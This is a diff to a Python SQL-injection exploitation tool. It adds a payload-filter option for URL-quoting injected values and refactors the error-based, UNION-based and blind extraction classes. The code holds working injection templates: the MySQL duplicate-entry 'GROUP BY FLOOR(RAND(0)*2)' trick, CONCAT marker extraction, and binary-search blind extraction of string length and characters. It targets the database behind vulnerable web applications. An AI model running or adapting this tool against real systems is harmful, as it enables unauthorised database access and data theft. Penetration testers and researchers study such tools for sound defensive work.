@@ -9,6 +9,8 @@ p.add_argument( '-p' , '--post'    , metavar = 'POST'         , help = 'to send 
 p.add_argument( '-c' , '--cookie'  , metavar = 'COOKIE'       , help = 'cookie to send with POST or GET'      )
 p.add_argument( '-r' , '--referer' , metavar = 'REFERER'      , help = 'Referer header in request'            )
 p.add_argument( '-a' , '--avoid'   , default = ''             , help = 'string of characters wich should be avoided in sql queries'   )
+p.add_argument( '-f' , '--filters' , default = ['q'], nargs = '+',    help = 'filters to apply to payload before injection at >><< place;' +\
+                                                                             'possible values: (q - quote; qp - quote_plus)' )
 p.add_argument( '-t' , '--sleep'   , metavar = 'SECONDS', type = int, help = 'Time to sleep between requests' )
 p.add_argument( '-v' , '--verbose' , action  = 'append_const' , const = 1, default = []  , help = 'how much verbose should be output' )
 p.add_argument( '-E' , '--engine'  , default = 'mysql', choices = ['mysql', 'postgres']  , help = 'engine of database'  )
@@ -149,7 +151,16 @@ class API( object ):
             self.log( 1, "[i] sleeping for %s seconds..." % self.a.sleep )
             time.sleep( self.a.sleep )
         r = re.compile( r'>>(.*)<<' )
+
+        ## applying filters to value...
+        for f in self.a.filters:
+            if f == 'q':
+                val = urllib.quote( val )
+            elif f == 'qp':
+                val = urllib.quote_plus( val )
+
         vs = [ self.a.upc, self.a.url, self.a.post, self.a.cookie ]
+
         vs = map( lambda x: x and r.sub( val, x ), vs )
         return self.raw_html( upc = vs[ 0 ], get = vs[ 1 ], post = vs[ 2 ], cookie = vs[ 3 ] )
 
@@ -259,7 +270,6 @@ class DError( API ):
             #sss = '''(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY MID((%s), FLOOR(RAND(0)*2), 64))''' % sss
             sss = '''(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY SUBSTRING((%s) from FLOOR(RAND(0)*2) for 64))''' % sss
             sss = sql.prepare( sss )
-            sss = urllib.quote( sss ) ## TODO: move this to filter functionality
             c, h = self.html( sss )
             open( '/tmp/debug.htm', 'w' ).write( h )
             m = re.search( r"Duplicate entry '([^']*)' for key", h )
@@ -272,7 +282,6 @@ class DUnion( API ):
     def get( self, sss ):
         sss = "CONCAT(0x424141414142,(%s),0x424141414142)" % sss
         sss = sql.prepare( sss )
-        sss = urllib.quote_plus( sss ) ## TODO: move this to filter functionality
         c, h = self.html( sss )
         m = re.search( 'BAAAAB(.*)BAAAAB', h )
         return m and m.group( 1 )
@@ -289,6 +298,7 @@ class DBlind( API ):
         while e - s > 0:
             m = ( e + s ) / 2
             tsss = '%s between(%s)and(%s)' % ( sss, s, m )
+            tsss = sql.prepare( tsss )                      ## TODO: warn!!! possible bugs ??
             self.log( 2, '[D] testing: %s' % tsss )
 
             _, l, _, _, dt = self.codes( tsss )
@@ -316,11 +326,11 @@ class DBlind( API ):
 
 
     def get( self, sss ):
-        l = self.dih( urllib.quote( 'length((%s))' % sss ), s = 0, e = 1000 )             ## TODO: move this to filter functionality
+        l = self.dih( 'length((%s))' % sss, s = 0, e = 1000 )
         self.log( 1, '[i] length(%s)=%s' % ( sss, l ) )
         res = ''
         for i in xrange( l ):
-            c = self.dih( urllib.quote( 'ascii(substring((%s),%s,1))' % ( sss, i+1 ) ) )  ## TODO: move this to filter functionality
+            c = self.dih( 'ascii(substring((%s),%s,1))' % ( sss, i+1 ) )
             res += chr( c )
             self.log( 0, chr( c ), newline = False )
         self.log( 0, '' )
